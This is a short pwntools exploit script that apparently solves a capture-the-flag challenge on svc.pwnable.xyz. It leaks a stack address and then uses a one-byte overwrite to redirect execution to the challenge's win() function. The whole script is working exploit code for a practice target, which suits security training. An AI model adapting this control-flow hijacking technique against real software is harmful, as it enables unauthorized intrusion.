from pwn import *

r = remote("svc.pwnable.xyz", 30012)

sla = r.sendlineafter
sa = r.sendafter

# get stack address
sla(b"> ", b"3")
rbp = int(r.recvline()[2:-1], 16) - 0xF8  # rbp of main()
log.info(f"rbp of main(): {hex(rbp)}")

# jump to win()
sa(b"> ", str(0x7B).ljust(0x20, "A").encode() + bytes([(rbp & 0xFF) + 0x9]))
sa(b"> ", str(1).ljust(0x20, "A").encode() + bytes([rbp & 0xFF]))

r.interactive()
